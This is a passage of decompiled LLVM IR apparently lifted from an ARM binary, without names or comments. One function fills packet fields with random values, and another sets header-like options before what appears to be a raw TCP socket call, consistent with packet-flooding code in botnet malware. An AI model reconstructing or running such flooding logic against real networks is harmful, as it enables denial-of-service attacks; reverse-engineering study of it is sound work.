  store i8 %v1_ae2c, i8* %v4_ae2c, align 1
  %v0_ae30 = load i32, i32* @r7, align 4
  %v1_ae30 = add i32 %v0_ae30, 4
  %v2_ae30 = inttoptr i32 %v1_ae30 to i8*
  %v3_ae30 = load i8, i8* %v2_ae30, align 1
  %v4_ae30 = zext i8 %v3_ae30 to i32
  store i32 %v4_ae30, i32* %r3.global-to-local, align 4
  %v1_ae34 = add i32 %v0_ae30, 5
  %v2_ae34 = inttoptr i32 %v1_ae34 to i8*
  %v3_ae34 = load i8, i8* %v2_ae34, align 1
  %v4_ae34 = zext i8 %v3_ae34 to i32
  store i32 %v0_ae30, i32* @r1, align 4
  %v4_ae3c = mul nuw nsw i32 %v4_ae34, 256
  %v5_ae3c = or i32 %v4_ae3c, %v4_ae30
  store i32 %v5_ae3c, i32* %r2.global-to-local, align 4
  %v0_ae40 = load i32, i32* @sl, align 4
  %v1_ae40 = trunc i32 %v0_ae40 to i8
  %v3_ae40 = add i32 %v0_ae30, 6
  %v4_ae40 = inttoptr i32 %v3_ae40 to i8*
  store i8 %v1_ae40, i8* %v4_ae40, align 1
  store i32 %stack_var_-156.0.ph, i32* %r3.global-to-local, align 4
  %v0_ae48 = load i32, i32* @sl, align 4
  %v1_ae48 = trunc i32 %v0_ae48 to i8
  %v2_ae48 = load i32, i32* @r7, align 4
  %v3_ae48 = add i32 %v2_ae48, 7
  %v4_ae48 = inttoptr i32 %v3_ae48 to i8*
  store i8 %v1_ae48, i8* %v4_ae48, align 1
  %v0_ae4c = load i32, i32* @r6, align 4
  store i32 %v0_ae4c, i32* %r0.global-to-local, align 4
  %v4_ae50 = call i32 @function_e480(i32 %v0_ae4c, i32 %v0_ae30, i32 %v5_ae3c, i32 %stack_var_-156.0.ph)
  %v5_ae50 = trunc i32 %v4_ae50 to i8
  store i32 %v4_ae50, i32* %r0.global-to-local, align 4
  %v3_ae54 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ae54, i32* %r3.global-to-local, align 4
  %v3_ae58 = mul i32 %v3_ae54, 32
  store i32 %v3_ae58, i32* %r2.global-to-local, align 4
  %v0_ae5c = load i32, i32* @r5, align 4
  %v1_ae5c = add i32 %v0_ae5c, 16
  %v2_ae5c = inttoptr i32 %v1_ae5c to i32*
  %v3_ae5c = load i32, i32* %v2_ae5c, align 4
  store i32 %v3_ae5c, i32* %r1.global-to-local, align 4
  %v5_ae60 = mul i32 %v3_ae54, 24
  store i32 %v5_ae60, i32* %r2.global-to-local, align 4
  %v4_ae6442 = udiv i32 %v4_ae50, 256
  %v1_ae68 = trunc i32 %v4_ae6442 to i8
  %v2_ae68 = load i32, i32* @r7, align 4
  %v3_ae68 = add i32 %v2_ae68, 7
  %v4_ae68 = inttoptr i32 %v3_ae68 to i8*
  store i8 %v1_ae68, i8* %v4_ae68, align 1
  %v0_ae6c = load i32, i32* %r2.global-to-local, align 4
  %v1_ae6c = load i32, i32* @sb, align 4
  %v2_ae6c = add i32 %v1_ae6c, %v0_ae6c
  store i32 %v2_ae6c, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_ae74 = load i32, i32* @r7, align 4
  %v4_ae74 = add i32 %v3_ae74, 6
  %v5_ae74 = inttoptr i32 %v4_ae74 to i8*
  store i8 %v5_ae50, i8* %v5_ae74, align 1
  %v0_ae78 = load i32, i32* %r1.global-to-local, align 4
  %v1_ae78 = load i32, i32* %lr.global-to-local, align 4
  %v2_ae78 = add i32 %v1_ae78, 4
  %v3_ae78 = inttoptr i32 %v2_ae78 to i32*
  store i32 %v0_ae78, i32* %v3_ae78, align 4
  %v0_ae7c = load i32, i32* %r3.global-to-local, align 4
  %v1_ae7c = trunc i32 %v0_ae7c to i8
  %v2_ae7c = load i32, i32* %r2.global-to-local, align 4
  %v3_ae7c = load i32, i32* @sb, align 4
  %v4_ae7c = add i32 %v3_ae7c, %v2_ae7c
  %v5_ae7c = inttoptr i32 %v4_ae7c to i8*
  store i8 %v1_ae7c, i8* %v5_ae7c, align 1
  %v0_ae80 = load i32, i32* @sl, align 4
  %v1_ae80 = trunc i32 %v0_ae80 to i8
  %v2_ae80 = load i32, i32* %lr.global-to-local, align 4
  %v3_ae80 = add i32 %v2_ae80, 2
  %v4_ae80 = inttoptr i32 %v3_ae80 to i8*
  store i8 %v1_ae80, i8* %v4_ae80, align 1
  %v0_ae84 = load i32, i32* @sl, align 4
  %v1_ae84 = trunc i32 %v0_ae84 to i8
  %v2_ae84 = load i32, i32* %lr.global-to-local, align 4
  %v3_ae84 = add i32 %v2_ae84, 1
  %v4_ae84 = inttoptr i32 %v3_ae84 to i8*
  store i8 %v1_ae84, i8* %v4_ae84, align 1
  %v0_ae88 = load i32, i32* @sl, align 4
  %v1_ae88 = trunc i32 %v0_ae88 to i8
  %v2_ae88 = load i32, i32* %lr.global-to-local, align 4
  %v3_ae88 = add i32 %v2_ae88, 3
  %v4_ae88 = inttoptr i32 %v3_ae88 to i8*
  store i8 %v1_ae88, i8* %v4_ae88, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ae94 = load i32, i32* @r5, align 4
  store i32 %v0_ae94, i32* %r1.global-to-local, align 4
  store i32 %v3_a9e4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-160.0.ph, i32* %r2.global-to-local, align 4
  %v0_aea0 = load i32, i32* %lr.global-to-local, align 4
  %v6_aea8 = inttoptr i32 %v0_ae94 to i32*
  %v7_aea8 = call i32 @function_13eec(i32 %v3_a9e4, i32* %v6_aea8, i32 %stack_var_-160.0.ph, i32 16384, i32 %v0_aea0, i32 16)
  %v3_aeac = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_aeac, i32* %r3.global-to-local, align 4
  %v1_aeb0 = add i32 %v3_aeac, 1
  store i32 %v1_aeb0, i32* %r0.global-to-local, align 4
  %v1_aeb4 = load i32, i32* @fp, align 4
  %v9_aeb4 = icmp eq i32 %v1_aeb0, %v1_aeb4
  store i1 %v9_aeb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aeb0, i32* %stack_var_-40, align 4
  %v6_aebc = icmp slt i32 %v1_aeb0, %v1_aeb4
  br i1 %v6_aebc, label %dec_label_pc_ad14, label %dec_label_pc_acfc

dec_label_pc_aec4:                                ; preds = %dec_label_pc_a9f4
  store i32 %v3_a9e4, i32* %r0.global-to-local, align 4
  %v1_aec8 = call i32 @function_13654(i32 %v3_a9e4)
  store i32 %v1_aec8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aecc

dec_label_pc_aecc:                                ; preds = %dec_label_pc_a890, %dec_label_pc_aec4
  %v29_aed0 = phi i32 [ %v3_a9e4, %dec_label_pc_a890 ], [ %v1_aec8, %dec_label_pc_aec4 ]
  store i32 %v3_a890, i32* %r4.global-to-local, align 4
  store i32 %v15_a890, i32* %r8.global-to-local, align 4
  store i32 %v21_a890, i32* %sl.global-to-local, align 4
  ret i32 %v29_aed0

dec_label_pc_aed4:                                ; preds = %dec_label_pc_ad14
  %v1_aed4 = add i32 %v2_ad1c, 16
  %v2_aed4 = inttoptr i32 %v1_aed4 to i32*
  %v3_aed4 = load i32, i32* %v2_aed4, align 4
  store i32 %v3_aed4, i32* %r4.global-to-local, align 4
  %v0_aed8 = call i32 @function_fe60()
  store i32 %v0_aed8, i32* %r0.global-to-local, align 4
  %v3_aedc = load i32, i32* %stack_var_-40, align 4
  %v5_aee4 = mul i32 %v3_aedc, 24
  %v0_aee8 = load i32, i32* %r4.global-to-local, align 4
  %v1_aeec = load i32, i32* @sb, align 4
  %v2_aeec = add i32 %v1_aeec, %v5_aee4
  store i32 %v2_aeec, i32* %r1.global-to-local, align 4
  %v1_aef0 = and i32 %v0_aee8, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_aef0, i32* %r3.global-to-local, align 4
  %v1_aee8 = udiv i32 %v0_aee8, 256
  %v3_aef4 = and i32 %v1_aee8, 65280
  store i32 %v3_aef4, i32* %r2.global-to-local, align 4
  %v3_aef8 = mul i32 %v0_aee8, 16777216
  store i32 %v3_aef8, i32* %ip.global-to-local, align 4
  %v1_aefc = add i32 %v2_aeec, 20
  %v2_aefc = inttoptr i32 %v1_aefc to i8*
  %v3_aefc = load i8, i8* %v2_aefc, align 1
  %v4_aefc = zext i8 %v3_aefc to i32
  store i32 %v4_aefc, i32* %lr.global-to-local, align 4
  %v4_af00 = mul i32 %v1_aef0, 256
  %v5_af00 = or i32 %v4_af00, %v3_aef8
  store i32 %v5_af00, i32* %ip.global-to-local, align 4
  %v4_af04 = udiv i32 %v0_aee8, 16777216
  %v5_af04 = or i32 %v3_aef4, %v4_af04
  %v2_af08 = or i32 %v5_af04, %v5_af00
  %v7_af0c = lshr i32 %v0_aed8, %v4_aefc
  %v8_af0c = add i32 %v7_af0c, %v2_af08
  %v3_af18 = mul i32 %v8_af0c, 16777216
  %v1_af1c = and i32 %v8_af0c, 65280
  store i32 %v1_af1c, i32* %r0.global-to-local, align 4
  store i32 %v5_a9d0, i32* %r2.global-to-local, align 4
  %v4_af28 = mul nuw nsw i32 %v1_af1c, 256
  %v5_af28 = or i32 %v4_af28, %v3_af18
  store i32 %v5_af28, i32* %r1.global-to-local, align 4
  %v2_af2c = call i32 @llvm.bswap.i32(i32 %v8_af0c)
  store i32 %v2_af2c, i32* %r3.global-to-local, align 4
  store i1 %v7_ad44, i1* %cpsr_z.global-to-local, align 1
  %v1_af34 = load i32, i32* @r5, align 4
  %v2_af34 = add i32 %v1_af34, 16
  %v3_af34 = inttoptr i32 %v2_af34 to i32*
  store i32 %v2_af2c, i32* %v3_af34, align 4
  br i1 %v2_ad44, label %dec_label_pc_af3c, label %dec_label_pc_ad4c

dec_label_pc_af3c:                                ; preds = %dec_label_pc_aed4, %dec_label_pc_ad40
  %v0_af3c = call i32 @function_fe60()
  store i32 %v0_af3c, i32* %r0.global-to-local, align 4
  store i32 %v3_aa34, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_af4c, i1* %cpsr_z.global-to-local, align 1
  %v1_af50 = load i32, i32* @r5, align 4
  %v2_af50 = add i32 %v1_af50, 12
  %v3_af50 = inttoptr i32 %v2_af50 to i32*
  store i32 %v0_af3c, i32* %v3_af50, align 4
  br i1 %v3_af4c, label %dec_label_pc_af58, label %dec_label_pc_af3c.dec_label_pc_ad60_crit_edge

dec_label_pc_af3c.dec_label_pc_ad60_crit_edge:    ; preds = %dec_label_pc_af3c
  %v1_ad64.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad60

dec_label_pc_af58:                                ; preds = %dec_label_pc_af3c, %dec_label_pc_ad4c
  %v0_af58 = call i32 @function_fe60()
  %v3_af60 = urem i32 %v0_af58, 65536
  store i32 %v3_af60, i32* %r0.global-to-local, align 4
  %v1_af68 = sub nsw i32 999, %v3_af60
  store i32 %v1_af68, i32* %r2.global-to-local, align 4
  %v3_af6c = sdiv i32 %v1_af68, 256
  store i32 %v3_af6c, i32* %r1.global-to-local, align 4
  %v3_af7039 = udiv i32 %v3_af60, 256
  store i32 %v3_af7039, i32* %r3.global-to-local, align 4
  %v1_af74 = trunc i32 %v3_af7039 to i8
  %v2_af74 = load i32, i32* @r5, align 4
  %v3_af74 = add i32 %v2_af74, 5
  %v4_af74 = inttoptr i32 %v3_af74 to i8*
  store i8 %v1_af74, i8* %v4_af74, align 1
  %v0_af78 = load i32, i32* %r0.global-to-local, align 4
  %v1_af78 = trunc i32 %v0_af78 to i8
  %v2_af78 = load i32, i32* @r5, align 4
  %v3_af78 = add i32 %v2_af78, 4
  %v4_af78 = inttoptr i32 %v3_af78 to i8*
  store i8 %v1_af78, i8* %v4_af78, align 1
  %v0_af7c = load i32, i32* %r1.global-to-local, align 4
  %v1_af7c = trunc i32 %v0_af7c to i8
  %v2_af7c = load i32, i32* @r6, align 4
  %v3_af7c = add i32 %v2_af7c, 5
  %v4_af7c = inttoptr i32 %v3_af7c to i8*
  store i8 %v1_af7c, i8* %v4_af7c, align 1
  store i32 %v3_aa38, i32* %r1.global-to-local, align 4
  %v1_af84 = load i32, i32* @r4, align 4
  %v9_af84 = icmp eq i32 %v3_aa38, %v1_af84
  store i1 %v9_af84, i1* %cpsr_z.global-to-local, align 1
  %v0_af88 = load i32, i32* %r2.global-to-local, align 4
  %v1_af88 = trunc i32 %v0_af88 to i8
  %v2_af88 = load i32, i32* @r6, align 4
  %v3_af88 = add i32 %v2_af88, 4
  %v4_af88 = inttoptr i32 %v3_af88 to i8*
  store i8 %v1_af88, i8* %v4_af88, align 1
  %v0_af8c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_af8c, label %dec_label_pc_af90, label %dec_label_pc_af58.dec_label_pc_ad6c_crit_edge

dec_label_pc_af58.dec_label_pc_ad6c_crit_edge:    ; preds = %dec_label_pc_af58
  %v1_ad70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad6c

dec_label_pc_af90:                                ; preds = %dec_label_pc_af58, %dec_label_pc_ad60
  %v0_af90 = call i32 @function_fe60()
  %v1_af90 = trunc i32 %v0_af90 to i8
  store i32 %v0_af90, i32* %r0.global-to-local, align 4
  store i32 %v3_aa3c, i32* %r2.global-to-local, align 4
  %v4_af98 = sdiv i32 %v0_af90, 256
  store i32 %v4_af98, i32* %r3.global-to-local, align 4
  %v1_af9c = load i32, i32* @r4, align 4
  %v9_af9c = icmp eq i32 %v3_aa3c, %v1_af9c
  store i1 %v9_af9c, i1* %cpsr_z.global-to-local, align 1
  %v3_afa0 = load i32, i32* @r5, align 4
  %v4_afa0 = add i32 %v3_afa0, 58
  %v5_afa0 = inttoptr i32 %v4_afa0 to i8*
  store i8 %v1_af90, i8* %v5_afa0, align 1
  %v0_afa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_afa4 = trunc i32 %v0_afa4 to i8
  %v2_afa4 = load i32, i32* @r7, align 4
  %v3_afa4 = add i32 %v2_afa4, 1
  %v4_afa4 = inttoptr i32 %v3_afa4 to i8*
  store i8 %v1_afa4, i8* %v4_afa4, align 1
  %v0_afa8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_afa8, label %dec_label_pc_afac, label %dec_label_pc_ad78

dec_label_pc_afac:                                ; preds = %dec_label_pc_af90, %dec_label_pc_ad6c
  %v0_afac = call i32 @function_fe60()
  %v1_afac = trunc i32 %v0_afac to i8
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  %v4_afb043 = udiv i32 %v0_afac, 256
  %v1_afb4 = trunc i32 %v4_afb043 to i8
  %v2_afb4 = load i32, i32* @r7, align 4
  %v3_afb4 = add i32 %v2_afb4, 3
  %v4_afb4 = inttoptr i32 %v3_afb4 to i8*
  store i8 %v1_afb4, i8* %v4_afb4, align 1
  store i32 %v1_aa2c, i32* %r3.global-to-local, align 4
  store i1 %v2_afbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_afbc, label %bb108, label %bb107

bb107:                                            ; preds = %dec_label_pc_afac
  %v1_afc0 = load i32, i32* @r5, align 4
  %v2_afc0 = add i32 %v1_afc0, 16
  %v3_afc0 = inttoptr i32 %v2_afc0 to i32*
  %v4_afc0 = load i32, i32* %v3_afc0, align 4
  store i32 %v4_afc0, i32* %r3.global-to-local, align 4
  br label %bb108

bb108:                                            ; preds = %dec_label_pc_afac, %bb107
  %v3_afc4 = load i32, i32* @r7, align 4
  %v4_afc4 = add i32 %v3_afc4, 2
  %v5_afc4 = inttoptr i32 %v4_afc4 to i8*
  store i8 %v1_afac, i8* %v5_afc4, align 1
  %v0_afc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_afc8, label %dec_label_pc_afd0, label %bb109

bb109:                                            ; preds = %bb108
  %v1_afc8 = load i32, i32* %r3.global-to-local, align 4
  %v2_afc8 = load i32, i32* @r6, align 4
  %v3_afc8 = add i32 %v2_afc8, 16
  %v4_afc8 = inttoptr i32 %v3_afc8 to i32*
  store i32 %v1_afc8, i32* %v4_afc8, align 4
  br label %dec_label_pc_ad8c

dec_label_pc_afd0:                                ; preds = %dec_label_pc_ad78, %bb108
  %v0_afd0 = call i32 @function_fe60()
  store i32 %v0_afd0, i32* %r0.global-to-local, align 4
  %v1_afd4 = load i32, i32* @r6, align 4
  %v2_afd4 = add i32 %v1_afd4, 16
  %v3_afd4 = inttoptr i32 %v2_afd4 to i32*
  store i32 %v0_afd0, i32* %v3_afd4, align 4
  br label %dec_label_pc_ad8c

dec_label_pc_afdc:                                ; preds = %dec_label_pc_ad8c
  %v0_afdc = load i32, i32* @r7, align 4
  %v1_afdc = add i32 %v0_afdc, 8
  store i32 %v1_afdc, i32* %r0.global-to-local, align 4
  store i32 %v5_a97c, i32* @r1, align 4
  %v1_afe4 = inttoptr i32 %v1_afdc to i8*
  %v2_afe4 = call i32 @function_1003c(i8* %v1_afe4)
  store i32 %v2_afe4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_adf0

dec_label_pc_afec:                                ; preds = %dec_label_pc_aa1c
  %v1_aff4 = add i32 %v5_a97c, 8
  store i32 %v1_aff4, i32* %r1.global-to-local, align 4
  %v1_aff8 = add i32 %v5_a97c, 66
  store i32 %v1_aff8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_acfc.preheader

; uselistorder directives
  uselistorder i32 %v1_aff8, { 1, 0 }
  uselistorder i32 %v1_aff4, { 1, 0 }
  uselistorder i32 %v0_afac, { 0, 2, 1 }
  uselistorder i32 %v0_af90, { 0, 2, 1 }
  uselistorder i32 %v3_af60, { 0, 2, 1 }
  uselistorder i32 %v2_af2c, { 1, 0 }
  uselistorder i32 %v8_af0c, { 1, 2, 0 }
  uselistorder i32 %v3_aef8, { 1, 0 }
  uselistorder i32 %v0_aee8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_aeb4, { 1, 2, 0 }
  uselistorder i32 %v1_aeb0, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_ae54, { 1, 0, 2 }
  uselistorder i32 %v4_ae50, { 0, 2, 1 }
  uselistorder i32 %v0_ae30, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_ae20, { 0, 2, 1 }
  uselistorder i32 %v4_ae04, { 1, 0 }
  uselistorder i32 %v7_ad28, { 2, 1, 0, 3 }
  uselistorder i32 %v0_acfc, { 1, 0 }
  uselistorder i1 %v7_ad44, { 2, 1, 0 }
  uselistorder i1 %v2_afbc, { 2, 3, 1, 0 }
  uselistorder i1 %v3_af4c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ac84, { 1, 0, 2 }
  uselistorder i32 %v3_ab0c, { 1, 0, 2 }
  uselistorder i32 %v3_aaec, { 1, 0 }
  uselistorder i32 %tmp91, { 1, 0 }
  uselistorder i32 %v1_aa90, { 1, 0 }
  uselistorder i32 %v1_aa8c, { 2, 1, 0 }
  uselistorder i32 %v1_aa78, { 1, 0 }
  uselistorder i32 %v1_aa74, { 2, 1, 0 }
  uselistorder i32 %v1_aa6c, { 0, 2, 1 }
  uselistorder i32 %v3_aa64, { 2, 1, 0 }
  uselistorder i32 %v0_aa40, { 1, 0, 2 }
  uselistorder i32 %v3_aa34, { 2, 1, 3, 0 }
  uselistorder i32 %v1_aa2c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v3_aa28, { 1, 0 }
  uselistorder i32 %v0_aa28, { 2, 1, 0 }
  uselistorder i32 %v0_aa20, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_aa1c, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_aa14, { 1, 0 }
  uselistorder i1 %v7_a9e8, { 1, 0 }
  uselistorder i32 %v3_a9e4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_a9d0, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_a99c, { 1, 2, 0 }
  uselistorder i32 %v5_a97c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_a930, { 1, 0 }
  uselistorder i8 %v5_a920, { 1, 0 }
  uselistorder i32 %v5_a904, { 1, 0 }
  uselistorder i32 %v6_a8c8, { 1, 0 }
  uselistorder i32 %v2_a8b0, { 0, 3, 1, 2 }
  uselistorder i32 %v1_a894, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %sl.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 46, 44, 45, 47, 25, 48, 49, 50, 51, 52, 53, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 10, 11, 13, 12, 14, 15, 17, 16, 18, 19, 21, 20, 23, 22, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 15, 31, 32, 34, 33, 35, 36, 37, 38, 40, 39, 44, 41, 42, 43, 46, 45, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 9, 10, 11, 12, 13, 3, 4, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 9, 10, 11 }
  uselistorder label %dec_label_pc_afd0, { 1, 0 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %dec_label_pc_aecc, { 1, 0 }
  uselistorder label %dec_label_pc_adf0, { 1, 0 }
  uselistorder label %dec_label_pc_ad8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_acfc.preheader, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
}

define i32 @function_b00c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b00c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_b00c = load i32, i32* @r4, align 4
  %v15_b00c = load i32, i32* @r8, align 4
  %v1_b010 = urem i32 %arg1, 256
  store i32 %v1_b010, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_b010, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_b028 = urem i32 %arg3, 256
  store i32 %v1_b028, i32* @r4, align 4
  %v2_b02c = call i32 @function_14254(i32 %v1_b010, i32 4)
  %v0_b030 = load i32, i32* @r5, align 4
  store i32 %v0_b030, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b040 = load i32, i32* @r4, align 4
  store i32 %v0_b040, i32* %r0.global-to-local, align 4
  %v5_b044 = inttoptr i32 %v0_b030 to i32*
  %v6_b044 = call i32 @function_a4e8(i32 %v0_b040, i32* %v5_b044, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b05c = load i32, i32* @r5, align 4
  store i32 %v0_b05c, i32* %r1.global-to-local, align 4
  %v0_b060 = load i32, i32* @r4, align 4
  store i32 %v0_b060, i32* %r0.global-to-local, align 4
  %v5_b064 = trunc i32 %v6_b044 to i8
  %v6_b068 = inttoptr i32 %v0_b05c to i32*
  %v7_b068 = call i32 @function_a4e8(i32 %v0_b060, i32* %v6_b068, i32 3, i32 65535)
  %v0_b06c = load i32, i32* @r5, align 4
  store i32 %v0_b06c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b068, i32* @r7, align 4
  %v0_b07c = load i32, i32* @r4, align 4
  store i32 %v0_b07c, i32* %r0.global-to-local, align 4
  %v4_b080 = inttoptr i32 %v0_b06c to i32*
  %v5_b080 = call i32 @function_a4e8(i32 %v0_b07c, i32* %v4_b080, i32 4, i32 64)
  %v0_b08c = load i32, i32* @r5, align 4
  store i32 %v0_b08c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b098 = load i32, i32* @r4, align 4
  store i32 %v0_b098, i32* %r0.global-to-local, align 4
  %v5_b09c = trunc i32 %v5_b080 to i8
  %v6_b0a0 = inttoptr i32 %v0_b08c to i32*
  %v7_b0a0 = call i32 @function_a4e8(i32 %v0_b098, i32* %v6_b0a0, i32 5, i32 1)
  %v1_b0ac = urem i32 %v7_b0a0, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b0b8 = load i32, i32* @r5, align 4
  store i32 %v0_b0b8, i32* %r1.global-to-local, align 4
  %v0_b0bc = load i32, i32* @r4, align 4
  store i32 %v0_b0bc, i32* %r0.global-to-local, align 4
  %v5_b0c4 = inttoptr i32 %v0_b0b8 to i32*
  %v6_b0c4 = call i32 @function_a4e8(i32 %v0_b0bc, i32* %v5_b0c4, i32 6, i32 65535)
  %v0_b0cc = load i32, i32* @r5, align 4
  store i32 %v0_b0cc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b0c4, i32* @sl, align 4
  %v0_b0dc = load i32, i32* @r4, align 4
  store i32 %v0_b0dc, i32* %r0.global-to-local, align 4
  %v4_b0e0 = inttoptr i32 %v0_b0cc to i32*
  %v5_b0e0 = call i32 @function_a4e8(i32 %v0_b0dc, i32* %v4_b0e0, i32 7, i32 65535)
  %v0_b0e4 = load i32, i32* @r5, align 4
  store i32 %v0_b0e4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_b0e0, i32* @r8, align 4
  %v0_b0f4 = load i32, i32* @r4, align 4
  store i32 %v0_b0f4, i32* %r0.global-to-local, align 4
  %v4_b0f8 = inttoptr i32 %v0_b0e4 to i32*
  %v5_b0f8 = call i32 @function_a4e8(i32 %v0_b0f4, i32* %v4_b0f8, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b108 = load i32, i32* @r5, align 4
  store i32 %v0_b108, i32* %r1.global-to-local, align 4
  %v0_b10c = load i32, i32* @r4, align 4
  store i32 %v0_b10c, i32* %r0.global-to-local, align 4
  %v4_b110 = inttoptr i32 %v0_b108 to i32*
  %v5_b110 = call i32 @function_a4e8(i32 %v0_b10c, i32* %v4_b110, i32 1, i32 1)
  %v1_b118 = urem i32 %v5_b110, 256
  %v0_b11c = load i32, i32* @r5, align 4
  store i32 %v0_b11c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b128 = load i32, i32* @r4, align 4
  store i32 %v0_b128, i32* %r0.global-to-local, align 4
  %v5_b130 = inttoptr i32 %v0_b11c to i32*
  %v6_b130 = call i32 @function_a4e8(i32 %v0_b128, i32* %v5_b130, i32 19, i32 0)
  %v0_b138 = load i32, i32* @r5, align 4
  store i32 %v0_b138, i32* %r1.global-to-local, align 4
  %v2_b13c = load i32, i32* @global_var_1ec7c.86, align 4
  store i32 %v2_b13c, i32* %r3.global-to-local, align 4
  store i32 %v6_b130, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b148 = load i32, i32* @r4, align 4
  store i32 %v0_b148, i32* %r0.global-to-local, align 4
  %v4_b14c = inttoptr i32 %v0_b138 to i32*
  %v5_b14c = call i32 @function_a4e8(i32 %v0_b148, i32* %v4_b14c, i32 25, i32 %v2_b13c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b160 = call i32 @function_13f50(i32 2, i32 3, i32 6)
